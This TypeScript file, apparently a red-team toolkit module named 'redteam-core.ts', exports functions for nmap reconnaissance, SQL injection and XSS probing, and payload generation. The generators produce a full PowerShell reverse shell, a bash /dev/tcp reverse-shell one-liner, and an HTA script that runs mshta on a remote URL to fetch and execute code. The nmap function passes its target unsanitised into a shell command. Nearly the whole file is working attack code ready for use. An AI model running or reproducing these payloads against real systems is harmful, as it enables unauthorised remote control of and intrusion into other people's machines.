// redteam-core.ts
import { exec } from 'child_process';

export const RedTeamOps = {
  // 🛰️ Recon Module
  runNmapScan: (target: string): Promise<string> => {
    return new Promise((resolve, reject) => {
      exec(`nmap -sV ${target}`, (error, stdout) => {
        if (error) reject(error);
        resolve(stdout);
      });
    });
  },

  dnsLookup: async (domain: string): Promise<any> => {
    const response = await fetch(`https://dns.google/resolve?name=${domain}`);
    return response.json();
  },

  // 🧨 Exploit Module
  sqlInjectionTest: async (target: string, payload: string): Promise<any> => {
    const response = await fetch(target, {
      method: 'POST',
      body: JSON.stringify({ query: payload }),
      headers: { 'Content-Type': 'application/json' }
    });
    return response.json();
  },

  xssProbe: (input: string): string => {
    return `<script>alert('${input}')<\/script>`;
  },

  // 💉 Payload Generator
  generatePowerShellReverseShell: (ip: string, port: number): string => {
    return `powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"`;
  },

  generateHTALoader: (url: string): string => {
    return `<script>
      var obj = new ActiveXObject('WScript.Shell');
      obj.Run('mshta ${url}');
    </script>`;
  },

  generateBashOneLiner: (ip: string, port: number): string => {
    return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
  }
};